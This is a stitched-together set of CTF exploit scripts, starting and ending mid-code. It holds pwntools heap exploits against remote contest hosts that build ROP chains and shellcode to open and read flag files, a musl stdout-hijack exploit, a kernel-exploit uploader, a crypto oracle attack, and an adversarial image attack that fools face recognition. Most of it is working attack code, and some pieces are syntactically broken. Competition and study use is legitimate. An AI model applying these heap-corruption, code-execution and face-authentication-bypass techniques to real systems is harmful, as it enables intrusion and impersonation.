pop rdx\n    a[42] = 0\n    a[43] = 0x4ff807 #0x43430c # syscall\n\n    # 0x4b2582 # 0x4b24d2 [rdi]=rsi; rsp+=0x38\n\n\nfrom pwn import *\n\ncontext.log_level = 'debug'\ncontext.arch = 'amd64'\n\n# io = process('./chall', aslr=False)\n# io = process('./pwn', aslr=False)\n# io = remote('127.0.0.1', 4455)\nio = remote('1.117.189.158', 60001)\n# elf = ELF('./chall')\n# libc = elf.libc\n\nrl = lambda\ta=False\t\t: io.recvline(a)\nru = lambda a,b=True\t: io.recvuntil(a,b)\nrn = lambda x\t\t\t: io.recvn(x)\nsn = lambda x\t\t\t: io.send(x)\nsl = lambda x\t\t\t: io.sendline(x)\nsa = lambda a,b\t\t\t: io.sendafter(a,b)\nsla = lambda a,b\t\t: io.sendlineafter(a,b)\nirt = lambda\t\t\t: io.interactive()\ndbg = lambda text=None  : gdb.attach(io, text)\nlg = lambda s,addr\t\t: log.info('\\033[1;31;40m %s --> 0x%x \\033[0m' % (s,addr))\nlg = lambda s\t\t\t: log.info('\\033[1;31;40m %s --> 0x%x \\033[0m' % (s, eval(s)))\nuu32 = lambda data\t\t: u32(data.ljust(4, '\\x00'))\nuu64 = lambda data\t\t: u64(data.ljust(8, '\\x00'))\n\ntext ='''heapinfo\n'''\n\ndef Gift(offset):\n\tsl(str(0))\n\tsl(offset)\n\ndef Add_Del(size, content):\n\tsl(str(1))\n\tsl(str(size))\n\tsl(content)\n\nGift('-'+str(0xa0160/8))\nGift(str(0))\n\n\nAdd_Del(0x100, '')\nAdd_Del(0x200, '')\nAdd_Del(0x400, '')\n\npayload = '\\x00'*0x18\npayload += p64(0x0001000000000000)\npayload += '\\x00'*0x18\npayload += p64(0x0001000000000000)\npayload += '\\x00'*0xb8\npayload += p16(0x72a0)\nAdd_Del(0x280, payload)\nAdd_Del(0x100, '\\x00'*0xf0+p64(0)+p32(0x681))\n\npayload = '\\x00'*0x18\npayload += p64(0x0000000100000000)\npayload += '\\x00'*0x18\npayload += p64(0x0001000000000000)\npayload += '\\x00'*0xb0\npayload += p16(0x73a0)\nAdd_Del(0x280, payload)\nAdd_Del(0xf0, '')\nAdd_Del(0x1000, '')\n\npayload = '\\x00'*0x18\npayload += p64(0)\npayload += '\\x00'*0x18\npayload += p64(0x0001000000000000)\npayload += '\\x00'*0x138\npayload += p16(0x72a0)\nAdd_Del(0x280, payload)\nAdd_Del(0x200, '\\x00'*0xf0+p64(0)+p32(0x101))\n\npayload = '\\x00'*0x78\npayload += p64(0x0001000000000000)\npayload += '\\x00'*0x1f8\npayload += p16(0x73a0)\nAdd_Del(0x280, payload)\nAdd_Del(0x400, '')\n\n\n#\npayload = '\\x00'*0x78\npayload += p64(0x0001000000000000)\npayload += '\\x00'*0x1f8\npayload += p16(0x33f0)\nAdd_Del(0x280, payload)\n\n\npayload = '\\x00'*0x100\npayload += p64(0) + p64(0x300)\nAdd_Del(0x400, payload)\n\n\npayload = '\\x00'*0x78\npayload += p64(0x0000000100000000)\npayload += '\\x00'*0x1f0\npayload += p16(0x3500)\nAdd_Del(0x280, payload)\n\npayload = '\\x00'*0x1a0\npayload += p64(0xfbad1800)\npayload += p64(0)*3\npayload += p16(0x3300)\nAdd_Del(0x3f0, payload)\n\npayload = '\\x00'*0x58\npayload += p64(0x0000000100000000)\npayload += '\\x00'*0x190\npayload += p16(0x5b28)\nAdd_Del(0x280, payload)\n\n\nsl('0'*0x1000)\nbase = uu64(rn(8)) - 0x212ca0\nlg('base')\n\npause()\n\n\n###############\n\n# dbg()\n# pause()\n\n\nsetcontext=0x7ffff7dc60dd-0x7ffff7d6e000+base\nrdx2rdi=0x7ffff7ec2930-0x7ffff7d6e000+base\naddress=0x7ffff7f5cb30-0x7ffff7d6e000+base\nrdi=0\nrsi=address+0xc0\nrdx=0x100\nread=0x7ffff7e7f130-0x7ffff7d6e000+base\nrsp=rsi\nrbp = 153280+base\nleave=371272+base\nstruct =p64(address)+p64(0)*3+p64(setcontext)\nstruct =struct.ljust(0x68, '\\x00')\nstruct+=p64(rdi)+p64(rsi)+p64(0)*2+p64(rdx)+p64(0)*2+p64(rsp)+p64(read)\n\nAdd_Del(0x2f0, p64(rdx2rdi)+struct)\nrdx = 0x000000000011c371+base# rdx+r12\nsys = 0x7ffff7e7f1e5-0x7ffff7d6e000+base\nrax = 304464+base\nrdi = 158578+base\nrsi = 161065+base\nrcx = 653346+base\nrax_r10 = 0x000000000005e4b7+base\n\n\nrop = p64(rdi)\nrop += p64(0xdddd000)\nrop += p64(rsi)\nrop += p64(0x1000)\nrop += p64(rdx)\nrop += p64(7)\nrop += p64(0)\nrop += p64(rcx)\nrop += p64(0x22)\nrop += p64(0x7ffff7e89a20-0x7ffff7d6e000+base)\nrop += p64(rax)\nrop += p64(0)\nrop += p64(rdi)\nrop += p64(0)\nrop += p64(rsi)\nrop += p64(0xdddd000)\nrop += p64(rdx)\nrop += p64(0x1000)\nrop += p64(0)\nrop += p64(sys)\nrop += p64(0xdddd000)\n\n\nsn(rop.ljust(0x100, '\\x00'))\n\n#context.log_level='debug'\nsc='''\nmov rax,1\nmov rdi,1\nmov rsi,0xdddd300\nmov rdx,0x600\nsyscall\n'''\nfk='''\nmov rdi,rax\nmov rax,0\nmov rsi,0xdddd300\nmov rdx,100\nsyscall\nmov rax,1\nmov rdi,rax\nsyscall\n'''\n\n# flag-03387efa-0ad7-4aaa-aae0-e44021ad310a\n# poc = asm(shellcraft.open(b'/home/pwn/'))+asm(shellcraft.getdents64(3, 0xdddd000 + 0x300, 0x600))+asm(sc)\npoc = asm(shellcraft.open(b'/home/pwn/flag-03387efa-0ad7-4aaa-aae0-e44021ad310a'))+asm(fk)\nsn(poc)\n\npause()\n\nirt()\n\n#encoding:utf-8\nfrom pwn import *\nimport re\n\nip = '1.116.236.251'\nport = 11124\nlocal = 0\nfilename = './babaheap'\nlibc_name = './libc.so.1'\n\ndef create_connect():\n\tglobal io, elf, libc\n\n\telf = ELF(filename)\n\tcontext(os=elf.os, arch=elf.arch)\n\t\n\tif local:\n\t\tio = process(filename)\n\t\tlibc_name = './libc.so.1'\n\n\telse:\n\t\tio = remote(ip, port)\n\t\tlibc_name = './libc.so.1'\n\n\ttry:\n\t\tlibc = ELF(libc_name)\n\texcept:\n\t\tpass\n\ncc = lambda : create_connect()\ns = lambda x : io.send(x)\nsl = lambda x : io.sendline(x)\nsla = lambda x, y: io.sendlineafter(x, y)\nsa = lambda x, y: io.sendafter(x, y)\ng = lambda x: gdb.attach(io, x)\n\nr = lambda : io.recv(timeout=1)\nrr = lambda x: io.recv(x, timeout=1)\nrl = lambda : io.recvline(keepends=False)\nru = lambda x : io.recvuntil(x)\nra = lambda : io.recvall(timeout=1)\nit = lambda : io.interactive()\ncl = lambda : io.close()\n\ndef regexp_out(data):\n    patterns = [\n        re.compile(r'(flag{.*?})'),\n        re.compile(r'xnuca{(.*?)}'),\n        re.compile(r'DASCTF{(.*?)}'),\n        re.compile(r'(WMCTF{.*?})'),\n        re.compile(r'[0-9a-zA-Z]{8}-[0-9a-zA-Z]{3}-[0-9a-zA-Z]{5}'),\n    ]\n\n    for pattern in patterns:\n        res = pattern.findall(data.decode() if isinstance(data, bytes) else data)\n        if len(res) > 0:\n            return str(res[0])\n\n    return None\n\ndef allocate(size, content=b'callmecro'):\n\tsla(b'Command: ', b'1')\n\tsla(b'Size: ', str(size).encode())\n\tif size == len(content):\n\t\tsa(b'Content: ', content)\n\telse:\n\t\tsla(b'Content: ', content)\n\ndef no_send_allocate(size, content=b'callmecro'):\n\tsla(b'Command: ', b'1')\n\tsla(b'Size: ', str(size).encode())\n\tif size == len(content):\n\t\ts(content)\n\telse:\n\t\tsl(content)\n\ndef update(idx, size, content=b'callmecro'):\n\tsla(b'Command: ', b'2')\n\tsla(b'Index: ', str(idx).encode())\n\tsla(b'Size: ', str(size).encode())\n\tif size <= 1:\n\t\treturn \n\n\tif size == len(content):\n\t\tsa(b'Content: ', content)\n\telse:\n\t\tsla(b'Content: ', content)\n\ndef delete(idx):\n\tsla(b'Command: ', b'3')\n\tsla(b'Index: ', str(idx).encode())\n\ndef view(idx):\n\tsla(b'Command: ', b'4')\n\tsla(b'Index: ', str(idx).encode())\n\tru(b': ')\n\treturn ru(b'\\n1. Allocate')[:-12]\n\ndef pwn():\n\tcc()\n    \n\tallocate(0x1b0) # 0\n\tallocate(0x1b0) # 1\n\t\n\tallocate(0x100) # 2\n\tallocate(0x100) # 3\n\n\tallocate(0x120) # 4\n\tallocate(0x120) # 5\n\tallocate(0x120) # 6\n\n\tdelete(0)\n\tupdate(0, 1)\n\tdelete(2)\n    \n\tallocate(0x1b0) # 0\n\tallocate(0x1b0) # 2\n\tdelete(4)\n\t\n\tchunk_0x120 = u64(view(2)[0x18:0x20])\n\tlog.success('No.4 chunk: 0x%x', chunk_0x120)\n\tlibc.address = chunk_0x120 - 0xb38d0\n\tlog.success('libc_addr: 0x%x', libc.address)\n\n\tdata_segment = libc.address + 0xb0000\n\tstdout = libc.address + 0xb0280\n\tmprotect = libc.address + 0x41DC0\n\n\tlog.success('stdout: 0x%x', stdout)\n\tmy_chunk = libc.address + 0xb0b10\n\tlog.success('my_chunk: 0x%x', my_chunk)\n\tchunk_6 = libc.address + 0xb3b50\n\n\tfake_chunk = stdout - 0x10\n\t# 任意写伪造 stdout 首部\n\tupdate(4, 0x11, p64(fake_chunk - 0x18) + p64(fake_chunk - 0x08))\n\tallocate(0x120) # 4\n\t\n\tdelete(6)\n\tupdate(6, 0x30, p64(fake_chunk - 0x10) + p64(my_chunk+0x8))\n\n\tupdate(2, 0x150, p64(0)*3+p64(chunk_6)+p64(my_chunk+0x8))\n\t# 6 -----> 通过 unbin，将 stdout_FILE 送上 head 位置\n\tallocate(0x120)\n\n\t# mov     rdx, [rdi+30h];mov     rsp, rdx;mov     rdx, [rdi+38h];jmp     rdx\n\tstack_mig = libc.address + 0x78D24\n\tret = libc.address + 0x15292\n\n\tpop_rdi = libc.address + 0x15291\n\tpop_rsi = libc.address + 0x1d829\n\tpop_rdx = libc.address + 0x2cdda\n\tpop_rax = libc.address + 0x16a16\n\tsyscall = libc.address + 0x23720\n\trop_chain = libc.address + 0xb3a20\n\n\trop = flat([\n\t\tpop_rdi, data_segment,\n\t\tpop_rsi, 0x8000,\n\t\tpop_rdx, 7,\n\t\tmprotect, rop_chain+0x40\n\t\t])\n\trop += asm(shellcraft.open('/flag'))\n\trop += asm(shellcraft.read(3, data_segment, 0x100))\n\trop += asm(shellcraft.write(1, data_segment, 0x50))\n\n\tupdate(5, 0x100, rop)\n\n\tpoc = flat({\n    \t0x30: 1,\t\t# f->wpos\n    \t0x38: 1,\t\t# f->wend\n    \t0x40: rop_chain, \n    \t0x48: ret, \n    \t0x58: stack_mig,# f->write\n    \t0x70: 1,\t\t# f->buf_size\n\t}, filler=b'\\x00', length=0x120)\n\n\t# 7 -----> 分配到 stdout_FILE\n\tno_send_allocate(0x120, poc)\n\n\tlog.success('flag: %s', regexp_out(ru(b'}')))\n\t# flag{use_musl_4ft3r_fr33}\n\tcl()\n\nif __name__ == '__main__':\n\tpwn()\n\nfrom pwn import *\nimport base64\ncontext(log_level='info', arch='amd64')\n\nBIN = \"./fs/exp\"\n\ndef exec_cmd(sh, cmd):\n\tsh.sendline(cmd)\n\tsh.recvuntil(\"$ \")\n\nif __name__ == \"__main__\":\n\t# sh = ssh(host=\"159.75.250.50\", user=\"ctf\", password=\"tctf2021\").run(\"/bin/sh\")\n\tsh = process(\"./run.sh\")\n\twith open(BIN, \"rb\") as f:\n\t\tdata = f.read()\n\tprint(\"upload\")\n\t# sh.upload_data(data, \"/home/ctf/exp\")\n\n\ttotal = 0\n\twhile True:\n\t\tif len(sh.recvuntil(\"~ $ \", timeout=5)) == 0:\n\t\t\tprint(\"Root!\")\n\t\t\tsh.sendline(\"cat /dev/sda\")\n\t\t\tsh.interactive()\n\t\tencoded = base64.b64encode(data)\n\t\tonce_size = 0x200\n\t\tcount = 0\n\t\tfor i in range(0, len(encoded), once_size):\n\t\t\tsh.sendline(\"echo -n \\\"%s\\\" >> benc\" % (encoded[i:i+once_size].decode()))\n\t\t\t# print (float(i)/len(encoded))\n\t\t\tcount += 1\n\t\tsh.sendline(\"cat benc | base64 -d > exp\")\n\t\tsh.sendline(\"chmod +x exp\")\n\t\tsh.sendline(\"./exp\")\n\t\tfor i in range(0, count + 2):\n\t\t\tsh.recvuntil(\"~ $ \")\n\t\ttotal += 1\n\t\tprint(total)\n\n\t# context(log_level='error')\n\tsh.interactive()\n\nwith open('mylog.txt', 'r') as f:\n    content = f.read()\n\nwhich_line = 'line 20' # 这里一行一行的修改，开头两行 用 \"#\" 号注释掉\n\ngraph = []\n\ndef ignore(line):\n    included = [\n        'Add',\n        'Shift',\n        'Store',gg\n        'Load'\n    ]\n\n    equals = []\n\n    return False\n\n    for x in included:\n        if x in line:\n            return False\n\n    for x in equals:\n        if x == line:\n            return False\n\n    return True\n\ntable = {}\n\nfor line in content.splitlines():\n    if line.startswith('#'):\n        continue\n\n    if len(line.strip()) == 0:\n        continue\n\n    orig_line = line\n    line = line.split(']]')[0]\n\n    part1 = line.split('===')[0]\n    print(line)\n    part2 = line.split('===')[1]\n\n    num, op = part1.split()\n\n\n    ins, out = part2.split('[[')\n\n    def to_int(x):\n        if x == '_':\n            return None\n        else:\n            return int(x)\n\n    if 'CallStaticJava' in line:\n        op = 'CallStaticJava: {}'.format(orig_line.split('#')[1].split('c=')[0])\n        part2 = part2.split('(')[0] + part2.split(')')[1]\n\n    ins, out = part2.split('[[')\n    if 'returns' in line:\n        ins, out = part2.split('[[')[0].split('returns')\n    if 'exception' in line:\n        ins, out = part2.split('[[')[0].split('exception')\n    if 'ConL' in orig_line:\n        con_value = orig_line.split('#')[1]\n\n\n    ins = list(map(to_int, ins.split()))\n    out = list(map(to_int, out.split()))\n\n    if ignore(op):\n        continue\n\n\n    table[num] = op\n    if 'ConL' in orig_line:\n        table[num] = op + ':{}'.format(con_value)\n\n    if not which_line in orig_line:\n        continue\n\n    print(orig_line)\n\n    graph.append((num, op, ins, out))\n\nwith open('log.dot', 'w') as f:\n    f.write('digraph {')\n    printed = []\n    for g in graph:\n        num, op, ins, out = g\n        f.write('{} [label=\"{} {}\"]\\n'.format(num, num, op))\n        printed.append(num)\n\n    out_printed = []\n\n    for g in graph:\n        num, op, ins, out = g\n        for o in out:\n            if o:\n                f.write('{} -> {};\\n'.format(num, o))\n                out_printed.append((num, o))\n\n        for i in ins:\n            if i:\n                if not i in printed:\n                    f.write('{} [label=\"{} {}\"]\\n'.format(i, i, table[str(i)]))\n                if not (i, num) in out_printed:\n                    f.write('{} -> {};\\n'.format(i, num))\n                    out_printed.append((i, num))\n\n\n    f.write('}')\n        \n\nimport hashlib,itertools,string\nfrom pwn import *\nfrom sympy import *\nimport gmpy2\n#context.log_level=\"debug\"\n\n#io=process(\"./debug\")\nio=remote(\"121.5.253.92\",34567)\n\n# pass pow\ndef pass_pow():\n\n    io.recvuntil(\"<3\\n\")\n    rr=str(io.readline().strip(),encoding = \"utf8\")\n    print(\"fuck:\",rr)\n    for i in itertools.permutations(string.printable,4):\n        #print(hashlib.sha256(\"\".join(i).encode()).hexdigest()[-6:],rr)\n        if hashlib.sha256(\"\".join(i).encode()).hexdigest()[-6:] == rr:\n            result=\"\".join(i)\n            print(\"pass_pow:\"+result)\n            io.writeline(result)\n            break\n    else:\n        print('error')\npass_pow()\n\n# magic word\nio.recvuntil(\"Tell me the magic words: \")\nio.writeline(\"🐶🍐🍳🏠🐣💀💺👈👉🏁🦅🔥🪓👃🎶📄\")\n\n# get n\ndef convert_emoji_to_number(emojistr):\n    d=\"🍐🍳🎶🏁🏠🐣🐶👃👈👉💀💺📄🔥🦅🪓\"\n    result=0\n    for i in emojistr:\n        #print(i,d.index(i))\n        result=(result<<4)+d.index(i)\n    return result\nio.recvuntil(\"> \")\nio.writeline(\"1\")\nio.recvuntil(\"🔒:\")\noo=str(io.readline().strip(),encoding=\"utf8\")\nn=convert_emoji_to_number(oo)\n\n# get v40 and reset\nio.recvuntil(\"> \")\nio.writeline(\"3\")\noo=str(io.readline().strip(),encoding=\"utf8\")\nv40=convert_emoji_to_number(oo)\nprint(\"v40:\",v40)\nprint(\"##\")\n\n# io func\ndef convert_number_to_emoji(number):\n    d=\"🍐🍳🎶🏁🏠🐣🐶👃👈👉💀💺📄🔥🦅🪓\"\n    result=\"\"\n    tmp=number\n    while tmp!=0:\n        result=d[tmp%16]+result\n        tmp=(tmp>>4)\n    return result\n\ndef put_up(v40):\n    io.recvuntil(\"> \")\n    io.writeline(\"2\")\n    io.recvuntil(\"❔:\")\n    io.writeline(convert_number_to_emoji(v40))\n    checkstr=str(io.readline().strip(),encoding=\"utf8\")\n    check_c=convert_emoji_to_number(checkstr)\n    #print(v40,convert_number_to_emoji(v40))\n    #print(check_c)\n    #print(gmpy2.jacobi(check_c,n))\n    return gmpy2.jacobi(check_c,n)\n\nup=13407807929942597099574024998205846127479365820592393377723561443721764030073546976801874298166903427690031858186486050853753882811946569946433649006084095\ndown=13\n\nwhile up-down>1:\n    newp=up-((up-down)//2)\n    print(newp)\n    if put_up(newp)==1:\n        up=newp\n    else:\n        down=newp\n\nprint(up)\nprint(down)\n\n\n# get v40 and reset\n'''\nio.recvuntil(\"> \")\nio.writeline(\"3\")\noo=str(io.readline().strip(),encoding=\"utf8\")\nv40=convert_emoji_to_number(oo)\nprint(\"v40:\",v40)\nprint(\"##\")'''\n\n# get flag\nio.recvuntil(\"> \")\nio.writeline(\"4\")\nio.recvuntil(\"🔑: \")\nio.writeline(convert_number_to_emoji(up))\nio.interactive()\n\nimport numpy as np\nimport data\n\nout_tab = np.array(data.out_tab).reshape((16, 256))\ntable1 = np.array(data.table1).reshape((9, 4, 4, 256))\ntable2 = np.array(data.table2).reshape((9, 4, 4, 256))\nswap_tab = np.array(data.swap_tab).reshape((9, 4, 4, 96, 16))\n\n\ndef arrange(data):\n    #idx = [0, 5, 10, 15, 4, 9, 14, 3, 8, 13, 2, 7, 12, 1, 6, 11]\n    #idx[i] == i * 5 % 16\n    vals = [data[i * 5 % 16] for i in range(16)]\n    return np.array(vals)\n\n\ndef split_byte(x):\n    vals = [x >> (8*i) & 0xFF for i in range(4)]\n    vals = vals[::-1]\n    vals = [[x&0xF, x>>4] for x in vals]\n    return vals\n\n\ndef sub_tab(tab, data):\n    vals = [split_byte(tab[i,data[i]]) for i in range(4)]\n    return np.array(vals)\n\n\ndef wtf(sw, low, high):\n    x1 = sw[low[0]+32][low[1]] + 80\n    y1 = sw[low[2]+48][low[3]]\n    v1 = sw[x1][y1]\n    x2 = sw[high[0]][high[1]] + 64\n    y2 = sw[high[2]+16][high[3]]\n    v2 = sw[x2][y2]\n    return v1 | (v2 << 4)\n\n\ndef wtf2(sw, vals):\n    ans = np.zeros(4, dtype=int)\n    for i in range(4):\n        low, high = vals[:,i,0], vals[:,i,1]\n        ans[i] = wtf(sw[i], low, high)\n    return ans\n\n\ndef myhash(data):\n\n    for i in range(9):\n        data = arrange(data)\n\n        data = data.reshape((4, 4))\n        for j in range(4):\n            vals = sub_tab(table1[i,j], data[j])\n            data[j] = wtf2(swap_tab[i,j], vals)\n            vals = sub_tab(table2[i,j], data[j])\n            data[j] = wtf2(swap_tab[i,j], vals)\n        data = data.reshape((16,))\n\n    data = arrange(data)\n    data = [out_tab[i,data[i]] for i in range(16)]\n    return data\n\n\ndef secure_decrypt(buf):\n    for _ in range(1337):\n        buf = myhash(buf)\n    return buf\n\nimport dlib\nimport face_recognition\nfrom PIL import Image\nimport random\nimport numpy as np\nfrom numpy.linalg import norm\nimport tensorflow as tf\nfrom converter.model import ScaleLayer, ReshapeLayer\n\n\nkeyface_encoding = [\n    -8.69139656e-02,  8.30148682e-02, 1.45035293e-02, -1.27609253e-01,\n    -1.42700657e-01, -1.58593412e-02, -9.87722948e-02, -1.23219922e-01,\n    1.22708268e-01, -1.35270610e-01, 2.30035380e-01, -1.23880222e-01,\n    -1.93354771e-01, -8.94580930e-02, -7.93846995e-02,  2.35654935e-01,\n    -1.81906566e-01, -1.34962142e-01, -1.31788421e-02, -1.04968855e-02,\n    4.10739481e-02,  2.44885264e-03, 8.52121785e-03,  5.79290688e-02,\n    -1.15343466e-01, -3.23355764e-01, -8.69766697e-02, -2.12586801e-02,\n    -9.11531225e-02, -3.72300223e-02, -2.80866250e-02,  1.02462806e-01,\n    -1.71462923e-01, -2.73887850e-02, 4.65847105e-02,  6.94189966e-02,\n    2.20984984e-02, -8.01130161e-02, 1.72256276e-01,  1.52742490e-04,\n    -2.54432797e-01,  5.17657027e-02, 1.13474540e-01,  2.19928578e-01,\n    1.68304369e-01,  1.28403883e-02, -1.04458071e-02, -1.59635231e-01,\n    1.74563184e-01, -1.74656272e-01, 1.19449571e-04,  1.32924736e-01,\n    4.52756137e-02, -5.11706285e-02, 1.84679162e-02, -7.74622187e-02,\n    2.99685597e-02,  1.66548729e-01, -1.57246217e-01, -3.03353313e-02,\n    9.47528481e-02, -6.63631782e-02, -3.17470208e-02, -1.85560584e-01,\n    2.26004064e-01,  1.28806546e-01, -1.15559876e-01, -2.06283614e-01,\n    1.40707687e-01, -1.00104943e-01, -8.33150819e-02,  8.25207531e-02,\n    -1.33005619e-01, -1.90996230e-01, -2.95138747e-01, -2.70678457e-02,\n    3.30062211e-01,  1.28746748e-01, -1.88333243e-01,  5.84503338e-02,\n    -8.36766977e-03, -7.47905578e-03, 1.23152651e-01,  1.65390745e-01,\n    5.01543283e-03,  1.08317155e-02, -8.22547823e-02, -4.03350629e-02,\n    2.58023173e-01, -4.20480780e-02, -2.24346798e-02,  2.48134851e-01,\n    -5.13138250e-04,  6.34072348e-02, 6.94152107e-03, -9.12788417e-03,\n    -1.11195974e-01,  3.06070670e-02, -1.62505597e-01, -1.20745702e-02,\n    -1.50425863e-02, -1.41657144e-02, -1.81038231e-02,  1.26067802e-01,\n    -1.41881093e-01,  1.04972236e-01, -5.23118973e-02,  3.43461856e-02,\n    -2.61395201e-02, -2.75162887e-02, -2.53709070e-02, -3.63143757e-02,\n    1.08865552e-01, -2.02156767e-01, 1.07431002e-01,  8.50366130e-02,\n    7.95102417e-02,  1.08320944e-01, 1.53148308e-01,  8.43793526e-02,\n    -2.67507583e-02, -3.10356300e-02, -2.16474622e-01, -2.27650702e-02,\n    1.20539531e-01, -9.48047191e-02, 1.40443712e-01,  5.64389490e-03,\n]\n\nkeyface_encoding = np.array(keyface_encoding)\n\n\ndef check(im):\n    encoding = face_recognition.face_encodings(im)[0]\n    #print(\"emb\", encoding)\n    dis = face_recognition.face_distance([keyface_encoding], encoding)\n    return dis[0]\n\ndef normalize_image(image):    \n    [R,G,B] = np.dsplit(image,image.shape[-1])\n\n    Rx = (R - 122.782) / 256.\n    Gx = (G - 117.001) / 256.\n    Bx = (B - 104.298) / 256.\n\n    new_image = np.dstack((Rx,Gx,Bx))\n    return new_image\n\n\ndef revert_image(image):    \n    [R,G,B] = np.dsplit(image,image.shape[-1])\n\n    Rx = R * 256 + 122.782\n    Gx = G * 256 + 117.001\n    Bx = B * 256 + 104.298\n\n    new_image = np.dstack((Rx,Gx,Bx))\n    new_image = np.clip(new_image, 0, 255)\n    new_image = np.array(new_image, dtype=np.uint8)\n    return new_image\n\ndef model_predict(im_faces):\n    global model\n    im_faces = tf.cast(im_faces, tf.float32)\n    with tf.GradientTape() as tape:\n        tape.watch(im_faces)\n        pred = model(im_faces)\n        #print(\"tensorflow\", pred)\n        loss = tf.norm(pred - keyface_encoding, axis=1, ord=2)\n    grad = tape.gradient(loss, im_faces)\n    return loss, grad\n\n\ndef edit_image(im, face):\n    global model\n    top, right, bottom, left = face\n\n    jitter_num = 1000\n    imgs = dlib.jitter_image(im, jitter_num)\n    imgs = np.array([normalize_image(img) for img in imgs])\n    loss, grad = model_predict(imgs)\n    print(tf.reduce_mean(loss))\n\n    grad = tf.reduce_mean(grad, axis=0)\n    im = normalize_image(im)\n    im[top:bottom,left:right]-= 1e-3 * grad[top:bottom,left:right]\n    im = revert_image(im)\n\n    return im\n\n\nim = face_recognition.load_image_file(\"save2.png\")\nprint(check(im))\n\nmodel_path = \"dlib_face_recognition_resnet_model_v1.h5\"\nmodel = tf.keras.models.load_model(model_path, custom_objects={'ScaleLayer': ScaleLayer, 'ReshapeLayer': ReshapeLayer})\n#model.summary()\n\ncnt = 0\n\nwhile True:\n    cnt += 1\n\n    loss2 = check(im)\n    print(loss2)\n    if loss2 < 0.25:\n        break\n    face = face_recognition.face_locations(im)[0]\n    im = edit_image(im, face)\n    Image.fromarray(im).save(\"hack.png\")\n\nfrom enum import Enum\nfrom typing import List\nimport lark\nimport zlib\nimport random\nimport string\nfrom pwn import *\nfrom hashlib import sha256\n\n\nMIN_COV = 30\n\n\nclass PartType(Enum):\n    LETTER = 0\n    WORD = 1\n    NUMBER = 2\n    DIGIT = 3\n    EXPRESSION = 4\n    STATEMENT = 5\n    STRING = 6\n\n\nclass Part:\n    def __init__(self, typ, data = None):\n        if typ == PartType.STRING and not isinstance(data, str):\n            raise ValueError\n        self.typ = typ\n        self.data = data\n    \n    def __repr__(self) -> str:\n        s = str(self.typ)\n        if self.data is not None:\n            s += \" \\\"%s\\\"\" % self.data\n        return s\n\n    def complexity(self):\n        if self.typ == PartType.EXPRESSION:\n            c = 13.5\n        elif self.typ == PartType.STATEMENT:\n            c = 42.73\n        elif self.typ == PartType.STRING:\n            c = len(self.data)\n        else:\n            c = 1\n        return float(c)\n    \n    def expandable(self):\n        return self.typ == PartType.STATEMENT or self.typ == PartType.EXPRESSION\n\n\nclass Rule:\n    def __init__(self, parts: List[Part], cov: int):\n        self.parts = parts\n        self.cov = cov\n\n    def __repr__(self) -> str:\n        return \" \".join(str(x) for x in self.parts) + \" -> cov_%d\" % self.cov\n\n    def complexity(self):\n        return sum([p.complexity() for p in self.parts])\n    \n    def expandable(self):\n        return any(p.expandable() for p in self.parts)\n\n\ndef parse_gram(in_gram):\n    with open(\"grammar\") as f:\n        gram = f.read()\n    parser = lark.Lark(gram)\n    return parser.parse(in_gram)\n\n\ndef parse_rules(gram):\n    assert gram.data == \"start\"\n    expr_rules = []\n    stmt_rules = []\n    for child in gram.children:\n        if child.data != \"rule\":\n            continue\n        rname = child.children[0]\n        if rname.data == \"start_rule\":\n            continue\n        rname = rname.children[0].data\n        if rname == \"s_expr\":\n            expr_rules = parse_rule(child.children)\n        else:\n            stmt_rules = parse_rule(child.children)\n    return expr_rules, stmt_rules\n\n\ndef parse_rule(ast):\n    ans = []\n    for x in ast:\n        if x.data != \"subrule\":\n            continue\n        r = parse_subrule(x)\n        ans.append(r)\n    return ans\n\n\ndef parse_subrule(ast):\n    parts = []\n    for x in ast.children:\n        if isinstance(x, lark.tree.Tree):\n            assert len(x.children) == 1\n            y = x.children[0]\n            if y.data == \"s_expr\":\n                part = Part(PartType.EXPRESSION)\n            elif y.data == \"s_stmt\":\n                part = Part(PartType.STATEMENT)\n            elif y.data == \"s_word\":\n                part = Part(PartType.WORD)\n            elif y.data == \"s_number\":\n                part = Part(PartType.NUMBER)\n            elif y.data == \"s_digit\":\n                part = Part(PartType.DIGIT)\n            elif y.data == \"s_letter\":\n                part = Part(PartType.LETTER)\n            elif y.data == \"string\":\n                data = y.children[0].strip('\"')\n                part = Part(PartType.STRING, data)\n            else:\n                raise ValueError(y)\n            parts.append(part)\n    cov = int(ast.children[-1])\n    return Rule(parts, cov)\n\n\nclass Solver:\n    def __init__(self, expr_rules: List[Rule], stmt_rules: List[Rule]):\n        self.expr_rules = expr_rules\n        self.stmt_rules = stmt_rules\n        self.expr_cov = [False] * len(self.expr_rules)\n        self.stmt_cov = [False] * len(self.stmt_rules)\n        self.count = 0\n\n    def all_cover(self):\n        return all(self.expr_cov) and all(self.stmt_cov)\n    \n    def run(self):\n        stmt_id = self.get_stmt_id(True)\n        sol, anum = self.generate(self.stmt_rules[stmt_id], MIN_COV)\n        #print(sol)\n        return sol\n    \n    def get_rule_id(rules, cov, expand):\n        rid = None\n        n = len(rules)\n        for i in range(n):\n            if expand and not rules[i].expandable():\n                continue\n            if not cov[i]:\n                rid = i\n                break\n        if rid is None:\n            if expand:\n                rid = random.choice([i for i in range(n) if rules[i].expandable()])\n            else:\n                rid = random.choice(range(n))\n        cov[rid] = True\n        return rid\n\n    def get_stmt_id(self, expand):\n        return Solver.get_rule_id(self.stmt_rules, self.stmt_cov, expand)\n\n    def get_expr_id(self, expand):\n        return Solver.get_rule_id(self.expr_rules, self.expr_cov, expand)\n\n    def generate(self, rule: Rule, cnum: int):\n        code = \"\"\n        anum = 1\n        #print(\"gen\", cnum, rule)\n        for part in rule.parts:\n            if part.typ == PartType.DIGIT or part.typ == PartType.NUMBER:\n                s = random.choice(string.digits)\n            elif part.typ == PartType.LETTER or part.typ == PartType.WORD:\n                s = random.choice(string.ascii_letters)\n            elif part.typ == PartType.STRING:\n                s = part.data\n            elif part.typ == PartType.EXPRESSION:\n                expr_id = self.get_expr_id(anum + 1 < cnum)\n                s, _anum = self.generate(self.expr_rules[expr_id], cnum - anum)\n                anum += _anum\n            elif part.typ == PartType.STATEMENT:\n                stmt_id = self.get_stmt_id(anum + 1 < cnum)\n                s, _anum = self.generate(self.stmt_rules[stmt_id], cnum - anum)\n                anum += _anum\n            else:\n                raise ValueError\n            #print(s, part)\n            code += s + \" \"\n        #print(anum, cnum)\n        #print(\"rule\", rule)\n        assert anum >= cnum\n        return code, anum\n\n\ndef proof(r):\n    line = r.recvline().decode().strip()\n    part = line[line.find(\"+\")+1:line.find(\")\")]\n    h = 